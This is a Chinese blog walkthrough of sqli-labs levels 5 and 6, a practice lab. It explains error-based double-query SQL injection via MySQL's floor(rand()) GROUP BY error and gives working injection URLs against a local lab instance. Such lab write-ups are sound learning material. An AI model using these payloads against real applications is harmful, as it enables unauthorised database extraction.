<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="小白菜鸟的sqli-labs闯关5-6"><meta name="keywords" content="SQL注入"><meta name="author" content="某獠,undefined"><meta name="copyright" content="某獠"><title>小白菜鸟的sqli-labs闯关5-6【Joker】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-SQL-Injection"><span class="toc-number">1.</span> <span class="toc-text">Double SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#适用情况："><span class="toc-number">1.1.</span> <span class="toc-text">适用情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#涉及的函数"><span class="toc-number">1.2.1.</span> <span class="toc-text">涉及的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5"><span class="toc-number">2.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6"><span class="toc-number">3.</span> <span class="toc-text">Less-6</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">某獠</div><div class="author-info-description">Keep up!</div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/PowerfulJoker/PowerfulJoker.github.io" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:741218399@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color10"></i></a><a class="links-button button-hover" href="tencent://message/?uin=741218399&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">14</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">7</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">4</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="title-name" href="/">Joker</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">小白菜鸟的sqli-labs闯关5-6</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2019-11-21 | 更新于 2019-11-22</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/Web/">Web</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div></div></div><div class="main-content"><p>Sqli-labs的第5，6关是基于错误的sql注入的一种: Double SQL Injection(双查询注入)，在讲解题步骤前，先来介绍一下双查询注入<br></p>
<h2 id="Double-SQL-Injection"><a href="#Double-SQL-Injection" class="headerlink" title="Double SQL Injection"></a>Double SQL Injection</h2><p>Double SQL Injection（双查询注入）: 通过构造SQL语句，将有用信息显示在SQL报错信息中的SQL注入技术。(参考博文给出的定义，详情见参考博文链接)<br><br>攻击条件: mysql数据库 版本&lt;8.0</p>
<h3 id="适用情况："><a href="#适用情况：" class="headerlink" title="适用情况："></a>适用情况：</h3><p>SQL语句正确时，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="涉及的函数"><a href="#涉及的函数" class="headerlink" title="涉及的函数"></a>涉及的函数</h4><p>concat(): 拼接字符串<br>rand(): 产生随机数，rand函数可接受一个整数参数，当该参数固定时，产生的随机数(随机数列)也是固定的<br>floor(): 向下取整函数，接受一个float型参数，返回小于等于输入参数的最大整数。<br>count(): 用于计数，通常用于统计行数，常与group by连用<br>group by语句： 对查询结果以某字段进行分组</p>
<p>通过下面这个例子来讲解Double SQL Injection的原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;0&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<p>我们将这条sql语句来分开进行解读：<br><br>1.rand(14)<br><br>首先是rand()函数，当其参数固定时，产生的随机数(随机数列是固定的)，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(14)</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(14);</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 | #与上次查询相同</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select rand(14) from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| rand(14)         |</span><br><span class="line">+------------------+</span><br><span class="line">| 0.65778395967352 | #与上次查询相同</span><br><span class="line">| 0.13113588572586 | </span><br><span class="line">| 0.68232758034237 |</span><br><span class="line">+------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>2.floor(rand(14)*2)<br></p>
<p>rand(14)\*2将随机数范围控制在[0,2),因此floor(rand(14)*2)产生的数字为0或1。由于rand(14)产生的随机数列是固定的，如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(14)*2) from information_schema.columns limit 1,4;</span><br><span class="line"># 表是随便选取的，由于要使mysql报错只需要前四位，所以限定输出前四位</span><br><span class="line">+-------------------+</span><br><span class="line">| floor(rand(14)*2) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 1 |</span><br><span class="line">|                 0 |</span><br><span class="line">|                 1 |</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>
3.group by与count()<br>
在SQL语句中有count和group by，Mysql同样会先创建一张临时表，有tally和设置了UNIQUE约束的group_key两个字段。<br>

<p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表<br><br>第一次扫描：<br><br>扫描到的第一个分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)*2)=0,所以此时实际插入到临时表的一行group_key为0，tally为1，临时表变成了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+-------+</span><br><span class="line">| group_key          | tally |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| 0                  |     1 |</span><br><span class="line">+--------------------+-------+</span><br></pre></td></tr></table></figure>
<p>第二次扫描：<br><br>扫描到的分组列是floor(rand(14)*2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，但此时group_key为floor(rand(14)*2)=0，临时表中已经存在，sql报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+-------+</span><br><span class="line">| group_key          | tally |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| 0                  |     1 |</span><br><span class="line">+--------------------+-------+</span><br><span class="line">| floor(rand(14)*2)=0|       |  &lt;-插入floor(rand(14)*2)</span><br><span class="line">+--------------------+-------+</span><br></pre></td></tr></table></figure>
<p>报错信息会把临时表中重复的字段暴露出来，因此我们可以将查询的数据库名、表名、字段名与floor(rand(14)*2)用concat()函数拼接在一起，报错时这些信息就会暴露出来。<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;mysql0&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>
<p>此时我们就能得到数据库名称了。类似的，通过构造以下格式的sql语句我们可以得到我们想要的其它信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(获取想要信息的查询语句, floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;</span><br><span class="line">#由于该语句包含两个查询语句，所以被称为双查询语句</span><br></pre></td></tr></table></figure>
<p>讲到这里，相信大家应该已经会Less-5和Less-6了吧，不懂的话可以再看一遍，或者直接看下面的参考博文，更详细哦。</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据页面提示，在hackerbar或网址栏中输入：<a href="http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1，出现如下提示：" target="_blank" rel="noopener">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1，出现如下提示：</a></p>
<p><img src="/images/a401.png" alt="note"><br>页面正常返回，但看不显示查询信息，将get请求改为：?id=1’ ,出现如下提示：</p>
<p><img src="/images/a402.png" alt="show_error"><br>说明id的类型是字符型，且服务器查询语句使用单引号闭合,并且可能存在双查询注入(之所以说可能，是因为假设我们此时不知道mysql的版本)。<br><br>使用order by 语句探测查询的字段数，因为接下来要使用union语句，按照前面介绍的构造SQL语句,在hackerbar或网址栏中输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1&apos; union select 1,concat((select database()),floor(rand(14)*2)) c ,count(*) from information_schema.columns group by c --+</span><br></pre></td></tr></table></figure>

<p><img src="/images/a403.png" alt="table_name"><br>也可以构造成以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8086/sqli-labs-master/Less-5/?id=1&apos; and &apos;1&apos; = (select count(*) from information_schema.tables group by concat((select database()),floor(rand(14)*2)))  --+</span><br></pre></td></tr></table></figure>
<p>该形式不需探测字段数。<br><br>接下来依样画葫芦对表名，字段名和数据进行双查询注入便可。</p>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>该题与上题唯一的不同便是服务器查询语句使用双引号闭合，同样构造双查询语句，从报错信息得到我们需要的信息即可。</p>
<p>参考博文：<a href="https://blog.csdn.net/wn314/article/details/89297560" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/89297560</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">某獠</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://powerfuljoker.github.io/2019/11/21/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B35-6/">https://powerfuljoker.github.io/2019/11/21/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B35-6/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://powerfuljoker.github.io">Joker</a>！</span></div></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2019/11/23/%E8%89%B2%E5%BD%A9%E5%B9%B3%E8%A1%A1%E4%B8%8E%E8%9E%8D%E5%90%88%E7%94%A8%E4%BA%8E%E6%B0%B4%E4%B8%8B%E5%9B%BE%E5%83%8F%E5%A2%9E%E5%BC%BA-matlab%E5%AE%9E%E7%8E%B0/"><i class="fas fa-angle-left">&nbsp;</i><span>色彩平衡与融合用于水下图像增强(matlab实现)</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2019/11/17/%E5%B0%8F%E7%99%BD%E8%8F%9C%E9%B8%9F%E7%9A%84sqli-labs%E9%97%AF%E5%85%B31-4/"><span>小白菜鸟的sqli-labs闯关1-4</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2020 By 某獠</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--></body></html>